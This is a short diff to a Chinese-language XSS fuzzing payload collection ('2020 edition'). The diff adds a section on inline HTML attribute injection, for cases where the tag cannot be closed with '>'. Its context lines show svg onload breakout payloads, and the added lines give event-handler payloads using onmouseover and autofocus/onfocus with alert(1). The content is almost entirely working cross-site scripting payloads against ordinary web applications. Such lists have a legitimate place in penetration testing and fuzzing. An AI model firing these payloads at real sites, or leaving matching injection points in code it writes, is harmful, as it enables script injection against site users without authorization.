@@ -27,3 +27,10 @@ xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
 </tag><svg onload=alert(1)>
 "></tag><svg onload=alert(1)>
 ```
+**3.HTML Injection - Inline （HTML注入-内联标签）** <br>
+当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>
+```
+"onmouseover=alert(1) //
+"autofocus onfocus=alert(1) //
+```
+
